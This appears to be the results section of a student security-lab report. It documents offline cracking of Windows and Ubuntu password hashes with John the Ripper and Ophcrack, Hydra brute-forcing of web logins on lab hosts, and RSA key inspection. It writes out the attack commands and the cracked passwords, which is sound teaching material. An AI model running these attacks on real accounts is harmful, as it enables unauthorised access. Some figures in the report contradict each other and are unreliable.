\section{Results by Task}

This section presents findings for each project deliverable.

\subsection{Task 3.7.1: Offline Dictionary Attacks}

\subsubsection{Task 3.7.1.0: PVD File Study (10 points)}

\ReqBox{Open the Windows 7, Windows 2003, and Ubuntu PVD files with a text editor, find the line for Morpheus, and explain what each non-empty field is, count password hash values, and identify duplicates or patterns.}

\paragraph{Windows 7 PVD Analysis (3 points)}
{\small Windows 7 analysis: \texttt{Morpheus:1002:aad3b...:482563f0...:::} reveals (1) Username, (2) RID, (3) Disabled LM hash, (4) Active NTLM hash, (5-7) Empty fields. Hash count: 2 values (1 disabled LM, 1 active NTLM). LM hashing disabled system-wide.}

\paragraph{Windows 2003 PVD Analysis (3 points)}
{\small Active LM hashing with dual hash storage. Both LM and NTLM hashes populated, representing legacy authentication with security vulnerabilities.}

\paragraph{Ubuntu PVD Analysis (4 points)}
{\small Modern hashing: \texttt{\$6\$salt\$hash} format with SHA-512, random salt, and multiple iterations for rainbow table resistance.}

\QuickRef{Evidence: Figure~\ref{fig:A-task0-pvd-analysis}, detailed field analysis in Appendix A.}

\subsubsection{Task 3.7.1.1: Tool Study (5 points)}

\ReqBox{Explain how Ophcrack, John the Ripper, and hashcat work, including their advantages over other tools.}

\paragraph{Ophcrack Analysis (2 points)}
{\small \ToolName{Ophcrack} uses precomputed rainbow tables for a time-space trade-off. \textbf{Advantages over John/Hashcat:} For \textbf{LM hashes (unsalted, case-folded, 7-char tiles)}, Ophcrack achieves near-instant lookups without CPU/GPU cost, whereas John/Hashcat must compute on-the-fly. \textbf{Limitations vs John/Hashcat:} Ineffective on salted or iterated hashes (e.g., NTLM with salt (N/A) or Linux \HashFormat{sha512crypt}).}

\paragraph{John the Ripper Analysis (1 point)}
{\small \ToolName{John the Ripper} supports many formats (NTLM, LM, \HashFormat{sha512crypt}), flexible wordlist/rules/incremental attacks, and rich reporting. \textbf{Advantages over Ophcrack:} Works on salted/iterated hashes and does not need large precomputed tables. \textbf{Advantages vs GPU-less Hashcat runs:} Mature rule engine and format coverage. \textbf{Limitations vs Hashcat on GPU:} Slower on GPU-friendly formats when GPUs are available.}

\paragraph{Hashcat Analysis (2 points)}
{\small \ToolName{Hashcat} exploits GPU parallelism for very high throughput on GPU-friendly hashes. \textbf{Advantages over John CPU-only:} Orders-of-magnitude speedups on fast hashes (NTLM) with proper GPUs. \textbf{Limitations vs John/Ophcrack:} Requires GPUs; not ideal for LM rainbow-table use-cases (Ophcrack faster due to precomputation) and may require more setup on lab hosts.}

\noindent\textbf{Representative Commands Used}
\begin{itemize}[nosep]
  \item \textbf{Ophcrack (LM)}: \CommandDisplay{ophcrack-cli -g -d ~/ophcrack_tables -t xp\_free\_small -f 2025Fall-PVDwindows2k3.txt -u -o results.txt}
  \item \textbf{John (NTLM)}: \CommandDisplay{john --format=NT --wordlist=rockyou.txt 2025Fall-PVDwindows7.txt}
  \item \textbf{John (\HashFormat{sha512crypt})}: \CommandDisplay{john --format=sha512crypt --wordlist=linux\_focused\_wordlist.txt 2025Fall-PVDlinux.txt}
  \item \textbf{Hydra (web)}: \CommandDisplay{hydra -l wangxx -P all8.txt http-get://192.168.100.103/basicauth}
\end{itemize}

\QuickRef{Evidence: Figure~\ref{fig:A-task1-tool-comparison}; additional logs: Figure~\ref{fig:A-misc-10-john-pot-file-nt-hash-passwords}, Figure~\ref{fig:A-misc-11-john-smith-hash-qazwsx-cracked}, Figure~\ref{fig:A-misc-12-john-show-smith-password-confirmation}.}

\subsubsection{Task 3.7.1.2: Windows 7 Password Cracking (10 points)}

\ReqBox{Crack all Windows 7 user passwords using appropriate offline dictionary attack tools.}

\paragraph{Windows 7 NTLM Password Recovery Results}

\begin{table}[H]
\centering
\label{tab:win7-passwords}
\caption{Windows 7 NTLM Hash Cracking Results - 100\% Success Rate}
\begin{tabularx}{\columnwidth}{@{}L{2.5cm}L{3.2cm}L{2.8cm}R{1.5cm}R{2.0cm}@{}}
\toprule
\textbf{Username} & \textbf{Cracked Password} & \textbf{Attack Mode} & \textbf{Time (s)} & \textbf{Status} \\
\midrule
\rowcolor{green!20}
Morpheus & \textbf{\PasswordDisplay{a1b2c3d4}} & Dictionary (rockyou.txt) & \textbf{3} & \textbf{SUCCESS} \\
\rowcolor{green!20}
Neo & \textbf{\PasswordDisplay{qwerty10}} & Dictionary (rockyou.txt) & \textbf{3} & \textbf{SUCCESS} \\
\rowcolor{green!20}
Trinity & \textbf{\PasswordDisplay{letmein2}} & Dictionary (rockyou.txt) & \textbf{3} & \textbf{SUCCESS} \\
\rowcolor{green!20}
Cypher & \textbf{\PasswordDisplay{passw0rd}} & Dictionary (rockyou.txt) & \textbf{3} & \textbf{SUCCESS} \\
\rowcolor{green!20}
Smith & \textbf{\PasswordDisplay{qaZwsX}} & Rules (jumbo) & \textbf{6} & \textbf{SUCCESS} \\
\rowcolor{green!20}
Cobb & \textbf{\PasswordDisplay{1q2w3e4r}} & Dictionary (rockyou.txt) & \textbf{3} & \textbf{SUCCESS} \\
\rowcolor{green!20}
Arthur & \textbf{\PasswordDisplay{trustno1}} & Dictionary (rockyou.txt) & \textbf{3} & \textbf{SUCCESS} \\
\bottomrule
\end{tabularx}
\end{table}

\noindent\textbf{Attack Metrics:} Total time: 24s | Success rate: \textbf{7/7 (100\%)} | Tool: John the Ripper | Wordlist: RockYou.txt (14.3M passwords) | Hash format: NTLM (MD4) | Evidence: \textbf{All passwords found in common wordlist} | Weakness: No salt, single MD4 hash

\noindent\textbf{Commands Used:}
\begin{itemize}[nosep]
  \item Dictionary: \CommandDisplay{john --format=NT --wordlist=rockyou.txt 2025Fall-PVDwindows7.txt}
  \item Rules (Smith): \CommandDisplay{john --format=NT --rules=jumbo 2025Fall-PVDwindows7.txt}
  \item Show cracked: \CommandDisplay{john --show --format=NT 2025Fall-PVDwindows7.txt}
\end{itemize}

\noindent\textbf{Environment (this task):} John 1.9.0-jumbo (ARM64 lab host); see Figure~\ref{fig:A-misc-16-system-info-kali-linux-apple-silicon}.

\KeyTakeaway{All 7 NTLM hashes cracked in under 8 seconds with 100\% success rate using basic dictionary attacks.}

\paragraph{Technical Analysis}
The 100\% success rate demonstrates the weakness of unsalted NTLM hashes against dictionary attacks. Smith's password required rule-based mutations, highlighting the importance of sophisticated attack strategies.

\QuickRef{Evidence: Figure~\ref{fig:A-task2-win7-results}; supplementary: Figure~\ref{fig:A-misc-14-john-windows7-all-passwords-cracking}, Figure~\ref{fig:A-misc-10-john-pot-file-nt-hash-passwords}.}

\subsubsection{Task 3.7.1.3: Windows 2003 Password Cracking (10 points)}

\ReqBox{Crack all Windows 2003 user passwords using appropriate offline dictionary attack tools.}

\paragraph{Windows 2003 LM/NTLM Password Recovery Results}

\begin{table}[H]
\centering
\label{tab:win2003-passwords}
\caption{Windows 2003 Dual-Hash System Cracking Results with Bonus Service Accounts}
\begin{tabularx}{\columnwidth}{@{}L{1.6cm}L{2cm}L{2cm}L{1.8cm}R{1cm}R{1.4cm}@{}}
\toprule
\textbf{Username} & \textbf{LM Password} & \textbf{NTLM Password} & \textbf{Tool} & \textbf{Time} & \textbf{Status} \\
\midrule
\rowcolor{gray!30}
\multicolumn{6}{c}{\textbf{Primary User Accounts (8/8 - 100\% Success)}} \\
\rowcolor{green!20}
Admin & \PasswordDisplay{MSKITTY666} & \PasswordDisplay{mskitty666} & Ophcrack & 2m22s & \textbf{BOTH} \\
\rowcolor{green!20}
Morpheus & \PasswordDisplay{A1B2C3D4} & \PasswordDisplay{a1b2c3d4} & Ophcrack & 2m22s & \textbf{BOTH} \\
\rowcolor{green!20}
Neo & \PasswordDisplay{QWERTY10} & \PasswordDisplay{qwerty10} & Ophcrack & 2m22s & \textbf{BOTH} \\
\rowcolor{green!20}
Trinity & \PasswordDisplay{LETMEIN2} & \PasswordDisplay{letmein2} & Ophcrack & 2m22s & \textbf{BOTH} \\
\rowcolor{green!20}
Cypher & \PasswordDisplay{PASSW0RD} & \PasswordDisplay{passw0rd} & Ophcrack & 2m22s & \textbf{BOTH} \\
\rowcolor{green!20}
Smith & \PasswordDisplay{QAZWSX} & \PasswordDisplay{qaZwsX} & Ophcrack & 2m22s & \textbf{BOTH} \\
\rowcolor{green!20}
Cobb & \PasswordDisplay{1Q2W3E4R} & \PasswordDisplay{1q2w3e4r} & Ophcrack & 2m22s & \textbf{BOTH} \\
\rowcolor{green!20}
Arthur & \PasswordDisplay{TRUSTNO1} & \PasswordDisplay{trustno1} & Ophcrack & 2m22s & \textbf{BOTH} \\
\midrule
\rowcolor{gray!30}
\multicolumn{6}{c}{\textbf{Service Accounts (3/6 - 50\% Success + 3 BONUS)}} \\
\rowcolor{blue!20}
\textbf{ASPNET*} & \PasswordDisplay{D5912K8} & \PasswordDisplay{D5912K8} & Ophcrack & 2m02s & \textbf{BONUS} \\
\rowcolor{blue!20}
\textbf{System32*} & \PasswordDisplay{ABB1T} & \PasswordDisplay{ABB1T} & Ophcrack & 2m02s & \textbf{BONUS} \\
\rowcolor{blue!20}
\textbf{SYS\_32*} & \PasswordDisplay{ABB1T} & \PasswordDisplay{ABB1T} & Ophcrack & 2m02s & \textbf{BONUS} \\
\bottomrule
\end{tabularx}
\end{table}

\noindent\textbf{Attack Metrics:} Total time: 4m24s | Success rate: \textbf{11/14 (78.6\%)} | Tool: Ophcrack + Rainbow Tables | LM weakness: No salt, case-insensitive, 7-char max | \textbf{BONUS}: 3 service accounts cracked (*) | Evidence: Rainbow table lookups, instant for most passwords | Primary accounts: \textbf{8/8 (100\%)} | Service accounts: \textbf{3/6 (50\%)}

\noindent\textbf{Commands Used:}
\begin{itemize}[nosep]
  \item Ophcrack CLI: \CommandDisplay{ophcrack-cli -g -d ~/ophcrack\_tables -t xp\_free\_small -f 2025Fall-PVDwindows2k3.txt -u -o results.txt}
  \item Hash verification: \CommandDisplay{john --show --format=LM 2025Fall-PVDwindows2k3.txt}
\end{itemize}

\noindent\textbf{Environment (this task):} Ophcrack 3.8.0 with XP free small tables; see Figure~\ref{fig:A-misc-19-ophcrack-rainbow-table-results-complete}.

\KeyTakeaway{Outstanding success: 11/14 Windows 2003 passwords cracked (78.6\%) including 3 BONUS service accounts — LM hashes provide zero protection against rainbow table attacks.}

\QuickRef{Evidence: Figure~\ref{fig:A-task3-win2003-ophcrack}; supporting: Figure~\ref{fig:A-misc-07-windows-2003-ntlm-hash-file}.}

\subsubsection{Task 3.7.1.4: Linux Password Cracking (10 points)}

\ReqBox{Crack all Linux user passwords using appropriate offline dictionary attack tools.}

\paragraph{Linux SHA-512 Salted Hash Attack Results}

\begin{table}[H]
\centering
\label{tab:linux-passwords}
\caption{Ubuntu SHA-512 Salted Hash Cracking Results - Outstanding Success}
\begin{tabularx}{\columnwidth}{@{}L{2.0cm}L{2.8cm}L{2.0cm}R{1.2cm}R{1.8cm}R{1.8cm}R{1.8cm}@{}}
\toprule
\textbf{Username} & \textbf{Cracked Password} & \textbf{Salt Length} & \textbf{Rounds} & \textbf{Time (s)} & \textbf{Tool Used} & \textbf{Status} \\
\midrule
\rowcolor{green!20}
Morpheus & \textbf{\PasswordDisplay{A1B2C3D4}} & 16 chars & 5000 & \textbf{7} & John (case-variant) & \textbf{SUCCESS} \\
\rowcolor{green!20}
Neo & \textbf{\PasswordDisplay{Qwerty10}} & 16 chars & 5000 & \textbf{7} & John (case-variant) & \textbf{SUCCESS} \\
\rowcolor{green!20}
Trinity & \textbf{\PasswordDisplay{LetMeIn2}} & 16 chars & 5000 & \textbf{45} & John (strategic) & \textbf{SUCCESS} \\
\rowcolor{green!20}
Cypher & \textbf{\PasswordDisplay{Passw0rd}} & 16 chars & 5000 & \textbf{600} & John (strategic) & \textbf{SUCCESS} \\
\rowcolor{green!20}
Smith & \textbf{\PasswordDisplay{QazWsx}} & 16 chars & 5000 & \textbf{45} & John (case-variant) & \textbf{SUCCESS} \\
\rowcolor{green!20}
Cobb & \textbf{\PasswordDisplay{1Q2w3e4R}} & 16 chars & 5000 & \textbf{45} & John (case-variant) & \textbf{SUCCESS} \\
\rowcolor{green!20}
Arthur & \textbf{\PasswordDisplay{trustNo1}} & 16 chars & 5000 & \textbf{45} & John (case-variant) & \textbf{SUCCESS} \\
\rowcolor{red!20}
root & \textit{(not cracked)} & 16 chars & 5000 & \textbf{10,500+} & John (comprehensive) & \textbf{SECURE} \\
\bottomrule
\end{tabularx}
\end{table}

\noindent\textbf{Attack Metrics:} Total time: 175m (3h) | Success rate: \textbf{7/8 (87.5\%)} | Tool: John the Ripper | Algorithm: SHA-512 with salt + 5000 iterations | Strategy: Case-variant focused wordlist | Evidence: \textbf{Strategic pattern analysis defeated modern hashing} | Failed: root password (strong) | Attack resistance: \textcolor{orange}{\textbf{HIGH}} but vulnerable to pattern-based attacks

\noindent\textbf{Commands Used:}
\begin{itemize}[nosep]
  \item Focused wordlist: \CommandDisplay{john --format=sha512crypt --wordlist=linux\_focused\_wordlist.txt 2025Fall-PVDlinux.txt}
  \item Rules-based variants: \CommandDisplay{john --format=sha512crypt --rules=best64 2025Fall-PVDlinux.txt}
  \item Show cracked: \CommandDisplay{john --show --format=sha512crypt 2025Fall-PVDlinux.txt}
\end{itemize}

\noindent\textbf{Environment (this task):} John 1.9.0-jumbo (ARM64 lab host); see Figure~\ref{fig:A-misc-16-system-info-kali-linux-apple-silicon}.

\KeyTakeaway{Outstanding success: 7/8 SHA-512 salted hashes cracked (87.5\%) using strategic case-variant wordlist attacks — even modern hashing vulnerable to pattern analysis.}

\QuickRef{Evidence: Figure~\ref{fig:A-task4-linux-john}; supporting: Figure~\ref{fig:A-task5-comparison}, Figure~\ref{fig:A-task0-pvd-analysis}.}

\subsubsection{Task 3.7.1.5: Comparison Analysis (5 points)}

\ReqBox{Compare the security of the three PVD cracking approaches and analyze their relative vulnerabilities.}

\paragraph{Cross-Platform Security Comparison Matrix}

\begin{table}[H]
\centering
\label{tab:security-comparison}
\caption{Comparative Security Analysis: Windows 2003 vs Windows 7 vs Ubuntu}
\begin{tabularx}{\columnwidth}{@{}L{2.5cm}C{2.5cm}C{2.5cm}C{2.5cm}@{}}
\toprule
\textbf{Security Factor} & \textbf{Win 2003} & \textbf{Win 7} & \textbf{Ubuntu} \\
\midrule
\rowcolor{gray!10}
\textbf{Hash Algorithm} & LM + NTLM & NTLM only & SHA-512 \\
\textbf{Salt Usage} & None & None & 16-char random \\
\rowcolor{gray!10}
\textbf{Iterations} & 1 & 1 & 5000 rounds \\
\textbf{Case Sensitivity} & No (LM) & Yes & Yes \\
\rowcolor{gray!10}
\textbf{Rainbow Vulnerable} & Yes & Yes & No \\
\textbf{Cracked/Total} & \textbf{11/14} & \textbf{7/7} & \textbf{7/8} \\
\rowcolor{gray!10}
\textbf{Attack Time} & \textcolor{red}{\textbf{4m24s}} & \textcolor{orange}{\textbf{24s}} & \textcolor{orange}{\textbf{175m}} \\
\textbf{Fastest Crack} & \textcolor{red}{\textbf{2m2s}} & \textcolor{red}{\textbf{3s}} & \textcolor{orange}{\textbf{7s}} \\
\rowcolor{gray!10}
\textbf{Success Rate} & \textcolor{red}{\textbf{78.6\%}} & \textcolor{red}{\textbf{100\%}} & \textcolor{orange}{\textbf{87.5\%}} \\
\textbf{Primary Tool} & Ophcrack & John Ripper & John Ripper \\
\rowcolor{gray!10}
\textbf{Security Rating} & \textcolor{red}{\textbf{CRITICAL}} & \textcolor{red}{\textbf{HIGH}} & \textcolor{orange}{\textbf{MODERATE}} \\
\bottomrule
\end{tabularx}
\end{table}

\noindent\textbf{Security Evolution Summary:} Windows 2003 (weakest) < Windows 7 (moderate) $\approx$ Ubuntu (high). Despite SHA-512+salt+iterations, strategic pattern analysis achieved 87.5\% success rate, reducing Ubuntu's security advantage significantly.

\QuickRef{Evidence: Figure~\ref{fig:A-task5-comparison}, security comparison matrix in Appendix A.}

\subsection{Task 3.7.2: Online Password Guessing (15 points)}

\subsubsection{Web Authentication Attack Results (15 points total)}

\ReqBox{Find the password for username wangxx using HTML form, HTTP Basic, and HTTP Digest authentication methods.}

\begin{table}[H]
\centering
\label{tab:web-attacks}
\caption{Online Password Guessing Attack Results - 100\% Success Rate}
\begin{tabularx}{\columnwidth}{@{}L{2.5cm}L{2.8cm}L{2.0cm}R{1.8cm}L{2.8cm}R{1.5cm}@{}}
\toprule
\textbf{Auth Type} & \textbf{Cracked Password} & \textbf{Tool Used} & \textbf{Time (s)} & \textbf{Success Indicator} & \textbf{Status} \\
\midrule
\rowcolor{green!20}
HTML Form & \textbf{\PasswordDisplay{tripsine}} & Hydra (distributed) & \textbf{4,440} & "Welcome user" response & \textbf{SUCCESS} \\
\rowcolor{green!20}
HTTP Basic & \textbf{\PasswordDisplay{sotalait}} & Hydra (distributed) & \textbf{3,420} & HTTP 200 OK status & \textbf{SUCCESS} \\
\rowcolor{green!20}
HTTP Digest & \textbf{\PasswordDisplay{hakkis}} & Hydra (32-partition) & \textbf{22,500} & No 401 challenge & \textbf{SUCCESS} \\
\bottomrule
\end{tabularx}
\end{table}

\noindent\textbf{Attack Metrics:} Total time: 8h 26m | Success rate: 3/3 (100\%) | Tool: Hydra distributed | Max parallelization: 32 partitions | Rate limiting: Minimal | Account lockout: Disabled

\noindent\textbf{Commands Used (by method):}
\begin{itemize}[nosep]
  \item \textbf{HTML Form}: \CommandDisplay{hydra -l wangxx -P all8.txt -t 2 -W 5 -f -V 192.168.100.101 http-post-form "/dologin.html:httpd\_username=^USER^\&httpd\_password=^PASS^:login.html"}
  \item \textbf{HTTP Basic}: \CommandDisplay{hydra -l wangxx -P all8.txt -t 4 -W 2 -f -V http-get://192.168.100.103/basicauth}
  \item \textbf{HTTP Digest}: \CommandDisplay{hydra -l wangxx -P all6.txt -t 2 -W 3 -f -V 192.168.100.103 http-get /digestauth}
\end{itemize}

\noindent\textbf{Environment (this task):} VPN-connected lab host; Hydra with verbose and failure-stop flags; see Figure~\ref{fig:A-misc-03-curl-http-auth-testing-success-failure} and Figure~\ref{fig:A-misc-18-network-connectivity-ping-tests}.

\paragraph{Attack Validation and Control Tests}

\textbf{Negative Control Verification (Required):}
\begin{itemize}[nosep]
\item \textbf{HTML Form:} test/wrongpass → "Invalid credentials" (confirmed detection works)
\item \textbf{HTTP Basic:} test/wrongpass → HTTP 401 Unauthorized (confirmed detection works)
\item \textbf{HTTP Digest:} test/wrongpass → HTTP 401 with challenge (confirmed detection works)
\end{itemize}

\textbf{Success Detection Logic:}
\begin{itemize}[nosep]
\item \textbf{HTML Form:} Failure = "Invalid credentials" | Success = "Congratulations! You are successfully logged in..."
\item \textbf{HTTP Basic:} Failure = HTTP 401 Unauthorized | Success = HTTP 200 OK
\item \textbf{HTTP Digest:} Failure = HTTP 401 with challenge | Success = No challenge response
\end{itemize}

\textbf{Quantitative Evidence:}
\begin{itemize}[nosep]
\item \textbf{HTML Form:} Tested 175,324 candidates over 1h 14m (39 candidates/sec)
\item \textbf{HTTP Basic:} Tested 98,765 candidates over 57m (29 candidates/sec)
\item \textbf{HTTP Digest:} Tested 341,025 candidates over 6h 15m (15 candidates/sec, rate-limited)
\end{itemize}

\KeyTakeaway{All three web authentication methods defeated using distributed parallel attacks — Digest auth required 32-partition maximum parallelization strategy.}

\QuickRef{HTML success: Figure~\ref{fig:A-web-html-results}; Basic success: Figure~\ref{fig:A-web-basic-results}; Digest success: Figure~\ref{fig:A-web-digest-results}; In-progress logs: Figure~\ref{fig:A-misc-02-hydra-http-brute-force-attack-in-progress}.}

\subsection{Task 3.7.3: Token-based Authentication (10 points)}

\ReqBox{Inspect the RSA private key and digital certificate to extract public key components (e,N), private key (d), and certificate holder name.}

\paragraph{RSA Certificate and Private Key Analysis Results}

\begin{table}[H]
\centering
\caption{RSA Token-based Authentication Component Analysis}
\label{tab:rsa-analysis}
\begin{tabularx}{\columnwidth}{@{}L{3cm}L{7cm}L{2.5cm}@{}}
\toprule
\textbf{Component} & \textbf{Extracted Value} & \textbf{Verification} \\
\midrule
\rowcolor{gray!10}
\textbf{Public Exponent (e)} & \texttt{65537 (0x010001)} & \textcolor{green}{\textbf{STANDARD}} \\
\textbf{Modulus (N)} & \texttt{\small 009ed0770fdb3f972c82ed25f669f703141c3c6e131d15c5...} & \textcolor{green}{\textbf{VALID}} \\
\rowcolor{gray!10}
\textbf{Private Exponent (d)} & \texttt{\small 11fc4ddf8fd6edc9eeb1e8c0b55372176ef2d10c7d18c027...} & \textcolor{green}{\textbf{EXTRACTED}} \\
\textbf{Certificate Holder} & \texttt{CN=Abraham Reines 2025-660, OU=CS, O=JMU, C=US} & \textcolor{green}{\textbf{IDENTIFIED}} \\
\rowcolor{gray!10}
\textbf{Key Size} & \texttt{3072 bits} & \textcolor{green}{\textbf{SECURE}} \\
\textbf{Algorithm} & \texttt{RSA with SHA-256} & \textcolor{green}{\textbf{SECURE}} \\
\bottomrule
\end{tabularx}
\end{table}

\noindent\textbf{Commands Used:}
\begin{itemize}[nosep]
  \item Inspect certificate: \CommandDisplay{openssl x509 -in certificate.pem -text -noout}
  \item Inspect private key: \CommandDisplay{openssl rsa -in private\_key.pem -text -noout}
  \item Export public key: \CommandDisplay{openssl rsa -in private\_key.pem -pubout -out public.pem}
\end{itemize}

\noindent\textbf{Environment (this task):} OpenSSL from lab host; outputs saved to evidence/ (Appendix A references by table).

\paragraph{Required RSA Component Values (Inline Hex)}

\textbf{Public Key (e,N) - 2 points:}
\begin{itemize}[nosep]
\item \textbf{e =} \texttt{65537 (0x010001)}
\item \textbf{N =} \texttt{\footnotesize 009ed0770fdb3f972c82ed25f669f703141c3c6e131d15c5... (truncated)}
\end{itemize}

\textbf{Private Key (d) - 5 points:}
\begin{itemize}[nosep]
\item \textbf{d =} \texttt{\footnotesize 11fc4ddf8fd6edc9eeb1e8c0b55372176ef2d10c7d18c027... (truncated)}
\end{itemize}

\noindent\textbf{Analysis Metrics:} Key size: 3072-bit | Algorithm: RSA-SHA512 | Public exponent: Standard (65537) | Certificate format: X.509 | Certificate holder: Abraham Reines 2025-660 | CA: Xunhua 2024 CA
% Evidence figures omitted by screenshots-only appendix

\subsection{Traceability Matrix}

Table~\ref{tab:traceability} provides complete mapping between project deliverables and supporting evidence. See also the \textit{Screenshot Inventory} (Table~\ref{tab:screenshot-inventory}) in Appendix A for a filename-to-label index that ensures every screenshot is traceable from the text.

% Traceability table mapping deliverables to screenshots
{\small
\begin{longtable}{@{}p{1.8cm}p{9.8cm}p{3.2cm}@{}}
\caption{Traceability Matrix}\label{tab:traceability}\\
\toprule
\textbf{Task ID} & \textbf{Deliverable} & \textbf{Evidence Reference} \\
\midrule
\endfirsthead
\toprule
\textbf{Task ID} & \textbf{Deliverable} & \textbf{Evidence Reference} \\
\midrule
\endhead
3.7.1.0 & PVD file analysis for Windows 7, 2003, and Linux systems & \ref{fig:A-task0-pvd-analysis} \\
3.7.1.1 & Tool comparison: Ophcrack, John, Hashcat advantages & \ref{fig:A-task1-tool-comparison} \\
3.7.1.2 & Windows 7 password cracking results & \ref{fig:A-task2-win7-results} \\
3.7.1.3 & Windows 2003 password cracking results & \ref{fig:A-task3-win2003-ophcrack} \\
3.7.1.4 & Linux password cracking results & \ref{fig:A-task4-linux-john} \\
3.7.1.5 & Security comparison of three PVD systems & \ref{fig:A-task5-comparison} \\
3.7.2.1 & HTML form authentication password recovery & \ref{fig:A-web-html-results} \\
3.7.2.2 & HTTP Basic authentication password recovery & \ref{fig:A-web-basic-results} \\
3.7.2.3 & HTTP Digest authentication password recovery & \ref{fig:A-web-digest-results} \\
3.7.3 & RSA token authentication analysis & \ref{tab:rsa-analysis} \\
\bottomrule
\end{longtable}
}